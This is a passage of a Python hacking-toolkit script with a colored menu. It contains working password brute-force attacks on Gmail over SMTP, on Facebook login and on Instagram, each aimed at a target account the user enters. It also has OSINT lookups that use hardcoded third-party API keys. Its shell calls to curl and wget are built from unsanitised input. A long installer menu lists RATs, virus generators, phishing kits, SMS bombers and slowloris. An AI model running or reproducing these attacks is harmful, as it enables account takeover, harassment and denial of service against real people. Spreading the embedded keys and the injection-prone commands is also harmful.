    print('\033[1;92m\n \033[1;91m[*]\033[1;97m Password length ' + str(MAX_LEN) + ' Selected')
    print('\033[1;92m \033[1;91m[*]\033[1;97m ' + str(cot) + ' Password will generate.')

    print('\033[1;92m\n \033[1;91m[*]\033[1;97m Generating.....\n')
    sleep(1.3)
    print('\033[1;92m\n \033[1;91m[*]\033[1;97m Following are the generated password.\n')

    sleep(1)

    for i in range(cot):
        
        DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
        LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
        SYMBOLS = ['@', '#', '$', '%', '=', ':', '?', '.', '/', '|', '~', '>', '*', '(', ')', '<']
        
        COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS + SYMBOLS
        rand_digit = random.choice(DIGITS)
        rand_upper = random.choice(UPCASE_CHARACTERS)
        rand_lower = random.choice(LOCASE_CHARACTERS)
        rand_symbol = random.choice(SYMBOLS)
        temp_pass = rand_digit + rand_upper + rand_lower + rand_symbol
        
        for x in range(MAX_LEN - 4):
            temp_pass = temp_pass + random.choice(COMBINED_LIST)
            temp_pass_list = array.array('u', temp_pass)
            random.shuffle(temp_pass_list)
        password = ""
        
        for x in temp_pass_list:
            password = password + x
        print('\033[1;91m>>> \033[1;97m', password)
        sleep(0.1)


## Hacking email bruteforce script ###########################################################

def hackmail():
    class GmailBruteForce():
        def __init__(self):
            self.accounts = []
            self.passwords = []
            self.init_smtplib()

        def get_pass_list(self,path):
            file = open(path, 'r',encoding='utf8').read().splitlines()
            for line in file:
                self.passwords.append(line)

        def init_smtplib(self):
            self.smtp = smtplib.SMTP("smtp.gmail.com",587)
            self.smtp.starttls()
            self.smtp.ehlo()

        def try_gmail(self):
            for user in self.accounts:
                for password in self.passwords:
                    try:
                        self.smtp.login(user,password)
                        print((f"\033[1;92m~ Found: {password}"))
                        self.smtp.quit()
                        self.init_smtplib()
                        break;
                    except smtplib.SMTPAuthenticationError:
                        print(("\033[1;97m~ Trying: \033[1;91m " + password))
    instance = GmailBruteForce()
    header = [('User-agent', 'Mozilla/5.0 (x11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    instance.accounts.append(usr)
    instance.get_pass_list(passlist)

    instance.try_gmail()

############ IP Address Tracking ###########################################################

def traceip():
    r = requests.get("http://ip-api.com/json/" + targetip + "?fields=66846719")
    data = json.loads(r.content)
    print("\n\033[1;91mIP Address Details:")
    print("\033[1;97m----------------------------")
    for key, value in data.items():
        print(f"\033[1;91m➤\033[1;97m " + "{}:\033[1;92m {}".format(key, value))
        sleep(0.1)
    print(f"\033[1;91m➤\033[1;97m Google Map: \033[1;94mhttps://maps.google.com/?q=" + str(r.json() ['lat']) + ',' + str(r.json() ['lon']))
    sleep(0.1)
    print()


def mail():
    response = requests.get("https://emailvalidation.abstractapi.com/v1/?api_key=0876d6977a2d4936a3327ae0f2724ae1&email=" + mailid)
    data = response.json()

    print("\n\033[1;91mEmail Address Details:")
    sleep(0.1)
    print("\033[1;97m----------------------------")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mEmail:\033[1;92m {data['email']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mAutocorrect: \033[1;92m{data['autocorrect']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mDeliverability:\033[1;92m {data['deliverability']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mQuality Score: \033[1;92m{data['quality_score']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mIs Valid Format: \033[1;92m{data['is_valid_format']['text']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mIs Free Email: \033[1;92m{data['is_free_email']['text']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mIs Disposable Email:\033[1;92m {data['is_disposable_email']['text']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mIs Role Email: \033[1;92m{data['is_role_email']['text']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mIs Catchall Email:\033[1;92m {data['is_catchall_email']['text']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mIs MX Found: \033[1;92m{data['is_mx_found']['text']}")
    sleep(0.1)
    print(f"\033[1;91m➤ \033[1;97mIs SMTP Valid: \033[1;92m{data['is_smtp_valid']['text']}")
    print()


############# Phone number information gathering ##############################################

def fonfo():
    url = "https://phonevalidation.abstractapi.com/v1/?api_key=6f2090a9f20448ea9e3cd54bb06c720c&phone=+" + phonr
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()

        print("\n\033[1;91mPhone Details:")
        sleep(0.1)
        print("\033[1;97m----------------------------")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mPhone Number:\033[1;92m {data['phone']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mIs Valid:\033[1;92m {data['valid']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mInternational Format: \033[1;92m{data['format']['international']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mLocal Format:\033[1;92m {data['format']['local']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mCountry Code: \033[1;92m{data['country']['code']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mCountry Name:\033[1;92m {data['country']['name']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mCountry Prefix: \033[1;92m{data['country']['prefix']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mLocation:\033[1;92m {data['location']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mPhone Type:\033[1;92m {data['type']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mCarrier:\033[1;92m {data['carrier']}")
        print()
    else:
        print(f"\033[1;91mFailed to retrieve data. Status Code: {response.status_code}")
        print(f"\n\033[1;91m{response.text}")
        print()

def confo():

    response = requests.get(f"https://companyenrichment.abstractapi.com/v1/?api_key=72cbba71cba7467d96972990273012af&domain={webx}")

    if response.status_code == 200:
        data = response.json()
        print("\n\033[1;91mCompany Enrichment Results:")
        sleep(0.1)
        print("\033[1;97m----------------------------")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mStatus Code: \033[1;92m{response.status_code}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mCompany Name: \033[1;92m{data['name']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mDomain: \033[1;92m{data['domain']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mFounded Year: \033[1;92m{data['year_founded']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mIndustry: \033[1;92m{data['industry']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mEmployees Count: \033[1;92m{data['employees_count']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mLocality:\033[1;92m {data['locality']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mCountry: \033[1;92m{data['country']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mLinkedIn URL: \033[1;94m{data['linkedin_url']}\n")
    else:
        print(f"\n\033[1;91mFailed to retrieve data. Status Code: {response.status_code}\n")


def ibandx():
    r = requests.get(f'https://ibanvalidation.abstractapi.com/v1/?api_key=e5fe815a8d3148ce943f0f2ae8a46ff0&iban={ibanx}')
    if r.status_code == 200:
        data = r.json()
        print("\n\033[1;91mIBAN Information:")
        sleep(0.1)
        print("\033[1;97m----------------------------")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mIBAN: \033[1;92m{data['iban']}")
        sleep(0.1)
        print(f"\033[1;91m➤ \033[1;97mIs Valid: \033[1;92m{data['is_valid']}\n")

    else:
        print(f"\033[1;91mFailed to retrieve data. Status Code: {r.status_code}")

def instahack():

	def login_to_instagram(username, password):
		try:
			loader = instaloader.Instaloader()
			loader.login(username, password)
			
			print("\033[1;92m~ Found:", password)
			print("\n")
			exit()
		except instaloader.TwoFactorAuthRequiredException:
			print("\033[1;92m~ Found:", password, "\033[1;92m(\033[1;91mTwo-Factor Authentication Enabled\033[1;92m)")
			print("\n")
			exit()

		except instaloader.exceptions.BadCredentialsException:
			pass
		except Exception as e:
			pass

	password_list_file = passlist
	with open(password_list_file, "r") as file:
		password_list = file.readlines()

	password_list = [password.strip() for password in password_list]

	for password in password_list:
		print("\033[1;97m~ Trying: \033[1;91m" + str(password))
		outs = ("instagram." + str(username) + ".txt")
		login_to_instagram(username, password)

# Getting channel link from github and open it

'''try:
    response = requests.get("https://raw.githubusercontent.com/VritraSecz/.../main/....", timeout=4)
    lines = response.text.splitlines()
    link = lines[1].strip()
    os.system("xdg-open " + link)
    sleep(1)
except requests.exceptions.Timeout:
    os.system("xdg-open https://youtube.com/@Technolex")
    sleep(1)
'''
#exit()

while True:
    os.system("clear")
    print(banner)
    mainx = input(main_menu)
    if mainx == "":
        pass


    elif mainx == "1" or mainx == "01":
        print(f"\033[1;91m[*] \033[1;97mBrute force attack selected")
        while True:
            os.system("clear")
            print(banner)
            brutx = input(brute)
            if brutx == "":
                pass

            
            elif brutx == "01" or brutx == "1":
                print()
                while True:
                    usr = input("\033[1;91m[?]\033[1;97m Enter target E-mail ID: \033[1;91m")
                    if usr == '':
                        print(f"\033[1;91m[!] Email is required *")
                    else:
                        break

                while True:
                    passlistx = input(f"\n\033[1;90mSimply press ENTER If you don't have your own password\n\033[1;91m[?] \033[1;97mEnter password list: \033[1;92m")
                    if passlistx == "":
                        passlist = "config/password/pass.txt"
                        print(f"\033[1;92m\nDefault password list is selected")
                        break
                    else:
                        passlistx = passlistx
                    
                
                print()
                hackmail()
                print()
                input("\033[1;94mPress ENTER To Continue")
                break


            elif brutx == "02" or brutx == "2":
                print()
                while True:
                    usr = input("\033[1;91m[?]\033[1;97m Enter target Facebook ID: \033[1;91m")
                    if usr == '':
                        pass
                    else:
                        break

                while True:
                    passlistx = input(f"\n\033[1;90mSimply press ENTER If you don't have your own password\n\033[1;91m[?] \033[1;97mEnter password list: \033[1;92m")
                    if passlistx == "":
                        passlist = "config/password/pass.txt"
                        print(f"\033[1;92m\nDefault password list is selected")
                        break
                    else:
                        passlistx = passlistx

                if sys.version_info[0] !=3: 
                    sys.exit()
                    
                post_url='https://www.facebook.com/login.php'
                headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',}
                payload={}
                cookie={}
                    
                def create_form():
                    form=dict()
                    cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
                    
                    data=requests.get(post_url,headers=headers)
                    for i in data.cookies:
                        cookie[i.name]=i.value
                    data=BeautifulSoup(data.text,'html.parser').form
                    if data.input['name']=='lsd':
                        form['lsd']=data.input['value']
                    return (form,cookie)
                    
                def function(email,passw,i):
                    global payload,cookie
                    if i%10==1:
                        payload,cookie=create_form()
                        payload['email']=email
                    payload['pass']=passw
                    r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
                    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
                        open('temp','w').write(str(r.content))
                        print('\n\033[1;92mpassword is: ',passw)
                        return True
                    return False
                    
                file=open(passlist,'r')
                    
                print(f"\n\033[1;92m* Targeted ID: {usr}\n")
                    
                i=0
                while file:
                    passw=file.readline().strip()
                    i+=1
                    if len(passw) < 6:
                        continue
                    print(f"\033[1;97m~ Trying:\033[1;91m {passw}")
                    if function(usr,passw,i):
                        break
                print()
                input("\033[1;94mPress ENTER To Continue")
                break

           
            elif brutx == "03" or brutx == "3":
                print()
                while True:
                    username = input("\033[1;91m[?]\033[1;97m Target username: \033[1;91m")
                    if username == '':
                        print(f"\033[1;91m[!] Username is required *")
                    else:
                        break

                while True:
                    passlistx = input(f"\n\033[1;90mSimply press ENTER If you don't have your own password\n\033[1;91m[?] \033[1;97mEnter password list: \033[1;92m")
                    if passlistx == "":
                        passlist = "config/password/pass.txt"
                        print(f"\033[1;92m\nDefault password list is selected\n")
                        break
                    else:
                        passlistx = passlistx

                instahack()
                print()
                input(f"/033[1;94mPress ENTER To Continue")
                exit()



            elif brutx == "95":
                break

            elif brutx == "99":
                exit()

            else:
                pass


    elif mainx == "2" or mainx == "02":
        print()
        while True:
            os.system("clear")
            print(banner)
            scrp = input(webscr)
            if scrp == '':
                pass

            elif scrp == '1' or scrp == '01':
                print()
                while True:
                    url = input("\033[1;91m[*]\033[1;97m Enter Web page URL: ")
                    if url == '':
                        pass
                    else:
                        break
                
                print()
                os.system("curl " + url)
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif scrp == '2' or scrp == '02':
                print()
                while True:
                    url = input("\033[1;91m[*]\033[1;97m Enter Web page URL: ")
                    if url == '':
                        pass

                    else:
                        break
                
                print()
                os.system("wget " + url)
                print()
                print(f"\033[1;91m[*]\033[1;97m Web page's file has been downloaded, and saved in your working directory.")
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif scrp == '3' or scrp == '03':
                print()
                while True:
                    url = input("\033[1;91m[*]\033[1;97m Enter Website URL: ")
                    if url == '':
                        pass

                    else:
                        break
                
                print()
                os.system("wget -r " + url)
                print()
                print(f"\033[1;91m[*]\033[1;97m Website file has been downloaded, and saved in your working directory.")
                print()
                input("\033[1;94mPress ENTER To Continue")


            elif scrp == "95":
                break

            elif scrp == "99":
                exit()

            else:
                print()
                print(f"\033[1;91m[*] Invalid input")
                sleep(0.8)
                print()

    ######################## Information gathering section ########################
            
    elif mainx == "3" or mainx == "03":
        while True:
            print()
            os.system("clear")
            print(banner)
            infx = input(getinfo)
            if infx == '':
                pass
                sleep(0.7)

            elif infx == '1' or infx == '01':
                print()
                while True:
                    targetip = input("\033[1;91m[*]\033[1;97m Enter IP address: \033[1;92m")
                    if targetip == '':
                        pass

                    else:
                        break
                
                traceip()
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif infx == '2' or infx == '02':
                print()
                while True:
                    mailid = input("\033[1;91m[*]\033[1;97m Enter E-mail ID: \033[1;92m")
                    if mailid == '':
                        pass

                    else:
                        break
                
                mail()
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif infx == '3' or infx == '03':
                print()
                while True:
                    phonr = input("\033[1;91m[*]\033[1;97m Enter Phone Number:\033[1;92m +")
                    if phonr == '':
                        pass

                    else:
                        break
                
                fonfo()
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif infx == '4' or infx == '04':
                print()
                while True:
                    webx = input("\033[1;91m[*]\033[1;97m Enter Company Website:\033[1;92m ")
                    if webx == '':
                        pass

                    else:
                        break
                
                confo()
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif infx == '5' or infx == '05':
                print()
                while True:
                    ibanx = input("\033[1;91m[*]\033[1;97m Enter IBAN:\033[1;92m ")
                    if ibanx == '':
                        pass

                    else:
                        break
                
                ibandx()
                print()
                input("\033[1;94mPress ENTER To Continue")

            elif infx == "95":
                break

            elif infx == "99":
                exit()

            else:
                print()
                print(f"\033[1;91m[*] Invalid input")
                sleep(0.8)
                print()


    ######################### Hash cracking section #######################


    elif mainx == "4" or mainx == "04":
        print()
        while True:
            os.system('clear')
            print(banner)
            asr = input(rest)
            if asr == '':
                pass
            elif asr == '1' or asr == '01':
                hash_type = 'md5'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '2' or asr == '02':
                hash_type = 'sha1'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '3' or asr == '03':
                hash_type = 'sha224'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '4' or asr == '04':
                hash_type = 'sha256'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '5' or asr == '05':
                hash_type = 'sha384'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '6' or asr == '06':
                hash_type = 'sha512'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '7' or asr == '07':
                hash_type = 'sha3_224'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '8' or asr == '08':
                hash_type = 'sha3_256'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '9' or asr == '09':
                hash_type = 'sha3_384'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '10':
                hash_type = 'sha3_512'
                crack()
                input("\n\033[1;34mPress ENTER To Continue")
            elif asr == '95':
                break
            elif asr == '99':
                exit()
            else:
                pass

          
    elif mainx == "5" or mainx == "05":
        print()
        genpassx()
        print()
        input("\033[1;94mPress ENTER To Continue")

    ######################### Hacking Tools installer section ###########################

    elif mainx == "6" or mainx == "06":
        while True:
            os.system("clear")
            print(banner)
            tolis = input(alltool)

            if tolis == '':
                pass

            elif tolis == '1' or tolis == '01':
                os.system('clear')
                print(banner)
                print()
                print()
                bombs()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '2' or tolis == '02':
                os.system('clear')
                print(banner)
                print()
                print()
                AdminHack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '3' or tolis == '03':
                os.system('clear')
                print(banner)
                print()
                print()
                AllHackingTools()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '4' or tolis == '04':
                os.system('clear')
                print(banner)
                print()
                print()
                AOXdeface()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '5' or tolis == '05':
                os.system('clear')
                print(banner)
                print()
                print()
                apktool()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '6' or tolis == '06':
                os.system('clear')
                print(banner)
                print()
                print()
                Asura()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '7' or tolis == '07':
                os.system('clear')
                print(banner)
                print()
                print()
                BeBomber()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '8' or tolis == '08':
                os.system('clear')
                print(banner)
                print()
                print()
                BannerX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '9' or tolis == '09':
                os.system('clear')
                print(banner)
                print()
                print()
                Beastb()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '10':
                os.system('clear')
                print(banner)
                print()
                print()
                beyawak()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '11' :
                os.system('clear')
                print(banner)
                print()
                print()
                Brutegram()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '12' :
                os.system('clear')
                print(banner)
                print()
                print()
                brutxx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '13' :
                os.system('clear')
                print(banner)
                print()
                print()
                mrbrutex()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '14' :
                os.system('clear')
                print(banner)
                print()
                print()
                camdump()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '15' :
                os.system('clear')
                print(banner)
                print()
                print()
                CloneWeb()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '16' :
                os.system('clear')
                print(banner)
                print()
                print()
                CrackerTool()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '17' :
                os.system('clear')
                print(banner)
                print()
                print()
                darkfly()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '18' :
                os.system('clear')
                print(banner)
                print()
                print()
                DecodeX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '19' :
                os.system('clear')
                print(banner)
                print()
                print()
                DefGen()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '20' :
                os.system('clear')
                print(banner)
                print()
                print()
                demozz()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '21' :
                os.system('clear')
                print(banner)
                print()
                print()
                DhAll()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '22' :
                os.system('clear')
                print(banner)
                print()
                print()
                DirAttack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '23' :
                os.system('clear')
                print(banner)
                print()
                print()
                dnsmp()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '24' :
                os.system('clear')
                print(banner)
                print()
                print()
                dvrsploit()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '25' :
                os.system('clear')
                print(banner)
                print()
                print()
                easyhack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '26' :
                os.system('clear')
                print(banner)
                print()
                print()
                findomain()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '27' :
                os.system('clear')
                print(banner)
                print()
                print()
                freefire()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '28' :
                os.system('clear')
                print(banner)
                print()
                print()
                fsociety()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '29' :
                os.system('clear')
                print(banner)
                print()
                print()
                GenVirus()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '30' :
                os.system('clear')
                print(banner)
                print()
                print()
                GeonumWh()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '31' :
                os.system('clear')
                print(banner)
                print()
                print()
                GHINSTA()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '32' :
                os.system('clear')
                print(banner)
                print()
                print()
                GmailHack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '33' :
                os.system('clear')
                print(banner)
                print()
                print()
                Hacked()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '34' :
                os.system('clear')
                print(banner)
                print()
                print()
                Hackerwasi()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '35' :
                os.system('clear')
                print(banner)
                print()
                print()
                hacklock()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '36' :
                os.system('clear')
                print(banner)
                print()
                print()
                Hammer()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '37' :
                os.system('clear')
                print(banner)
                print()
                print()
                HCORat()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '38' :
                os.system('clear')
                print(banner)
                print()
                print()
                hsploit()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '39' :
                os.system('clear')
                print(banner)
                print()
                print()
                httpfy()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '40' :
                os.system('clear')
                print(banner)
                print()
                print()
                hsxpduky()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '41' :
                os.system('clear')
                print(banner)
                print()
                print()
                infect()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '42' :
                os.system('clear')
                print(banner)
                print()
                print()
                infogx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '43' :
                os.system('clear')
                print(banner)
                print()
                print()
                instahack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '44' :
                os.system('clear')
                print(banner)
                print()
                print()
                InstaReport()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '45' :
                os.system('clear')
                print(banner)
                print()
                print()
                ipdrone()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '46' :
                os.system('clear')
                print(banner)
                print()
                print()
                IPRover()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '47' :
                os.system('clear')
                print(banner)
                print()
                print()
                jarvswlcm()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '48' :
                os.system('clear')
                print(banner)
                print()
                print()
                kalimux()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '49' :
                os.system('clear')
                print(banner)
                print()
                print()
                kissnt()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '50' :
                os.system('clear')
                print(banner)
                print()
                print()
                LinuxX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '51' :
                os.system('clear')
                print(banner)
                print()
                print()
                LordPhish()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '52' :
                os.system('clear')
                print(banner)
                print()
                print()
                Lucifer()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '53' :
                os.system('clear')
                print(banner)
                print()
                print()
                maskphish()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '54' :
                os.system('clear')
                print(banner)
                print()
                print()
                Mdork()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '55' :
                os.system('clear')
                print(banner)
                print()
                print()
                megafile()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '56' :
                os.system('clear')
                print(banner)
                print()
                print()
                metasp()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '57' :
                os.system('clear')
                print(banner)
                print()
                print()
                mubuntu()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '58' :
                os.system('clear')
                print(banner)
                print()
                print()
                mrphish()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '59' :
                os.system('clear')
                print(banner)
                print()
                print()
                MyServer()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '60' :
                os.system('clear')
                print(banner)
                print()
                print()
                netscan()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '61' :
                os.system('clear')
                print(banner)
                print()
                print()
                nikto()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '62' :
                os.system('clear')
                print(banner)
                print()
                print()
                nmap()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '63' :
                os.system('clear')
                print(banner)
                print()
                print()
                onex()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '64' :
                os.system('clear')
                print(banner)
                print()
                print()
                osiig()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '65' :
                os.system('clear')
                print(banner)
                print()
                print()
                Osintgram()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '66' :
                os.system('clear')
                print(banner)
                print()
                print()
                partterx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '67' :
                os.system('clear')
                print(banner)
                print()
                print()
                PassX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '68' :
                os.system('clear')
                print(banner)
                print()
                print()
                bgmip()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '69' :
                os.system('clear')
                print(banner)
                print()
                print()
                Pureblood()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '70' :
                os.system('clear')
                print(banner)
                print()
                print()
                Pycompile()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '71' :
                os.system('clear')
                print(banner)
                print()
                print()
                qurxin()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '72' :
                os.system('clear')
                print(banner)
                print()
                print()
                REDHAWK()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '73' :
                os.system('clear')
                print(banner)
                print()
                print()
                rsecxxx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '74' :
                os.system('clear')
                print(banner)
                print()
                print()
                saycheese()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '75' :
                os.system('clear')
                print(banner)
                print()
                print()
                ScannerX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '76' :
                os.system('clear')
                print(banner)
                print()
                print()
                seeker()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '77' :
                os.system('clear')
                print(banner)
                print()
                print()
                seeu()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '78' :
                os.system('clear')
                print(banner)
                print()
                print()
                sortby()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '79' :
                os.system('clear')
                print(banner)
                print()
                print()
                slowloris()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '80' :
                os.system('clear')
                print(banner)
                print()
                print()
                toolboxt()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '81' :
                os.system('clear')
                print(banner)
                print()
                print()
                SploitX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '82' :
                os.system('clear')
                print(banner)
                print()
                print()
                sqlmap()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '83' :
                os.system('clear')
                print(banner)
                print()
                print()
                tbomb()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '84' :
                os.system('clear')
                print(banner)
                print()
                print()
                tscrap()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '85' :
                os.system('clear')
                print(banner)
                print()
                print()
                TermuxArch()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '86' :
                os.system('clear')
                print(banner)
                print()
                print()
                TermuxCyberArmy()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '87' :
                os.system('clear')
                print(banner)
                print()
                print()
                tdesktp()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '88' :
                os.system('clear')
                print(banner)
                print()
                print()
                tfingrp()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '89' :
                os.system('clear')
                print(banner)
                print()
                print()
                heroku()
                print()
                input('\033[1;94mPress ENTER To Continue')

